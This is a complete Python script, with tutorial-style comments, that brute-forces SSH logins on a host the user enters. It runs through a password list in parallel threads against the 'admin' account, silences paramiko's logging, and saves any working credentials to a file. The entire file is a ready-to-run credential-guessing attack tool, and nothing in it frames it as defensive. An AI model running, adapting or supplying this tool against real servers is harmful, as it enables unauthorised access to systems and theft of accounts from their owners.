import csv
import ipaddress
import threading
import time
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception

# This function is responsible for the ssh client connecting.
def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    # Set the host policies. We add the new hostname and new host key to the local HostKeys object.
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        # We attempt to connect to the host, on port 22 which is ssh, with password, and username that was read from the csv file.
        ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300)
        # If it didn't throw an exception, we know the credentials were successful, so we write it to a file.
        with open("credentials_found.txt", "a") as fh:
            # We write the credentials that worked to a file.
            print(f"Username - {username} and Password - {password} found.")
            fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
            return True
    except AuthenticationException:
        print(f"Username - {username} and Password - {password} is Incorrect.")
        return False
    except ssh_exception.SSHException as e:
        print(f"**** Attempting to connect - {e} ****")
        return False

# This function gets a valid IP address from the user.
def get_ip_address():
    # We create a while loop, that we'll break out of only once we've received a valid IP Address.
    while True:
        host = input("Please enter the host ip address: ")
        try:
            # Check if host is a valid IPv4 address. If so we return host.
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            # If host is not a valid IPv4 address we send the message that the user should enter a valid ip address.
            print("Please enter a valid ip address.")

# The program will start in the main function.
def __main__():
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    # To keep to functional programming standards we declare ssh_port inside a function.
    list_file = "passwords.txt"
    host = get_ip_address()
    with open(list_file, "r") as fh:
        passwords = fh.read().splitlines()
    # This function reads a txt file with passwords.
    for password in passwords:
        # We create a thread on the ssh_connect function, and send the correct arguments to it.
        t = threading.Thread(target=ssh_connect, args=(host, 'admin', password,))
        # We start the thread.
        t.start()
        # We leave a small time between starting a new connection thread.
        time.sleep(0.2)

#  We run the main function where execution starts.
if __name__ == '__main__':
    __main__()
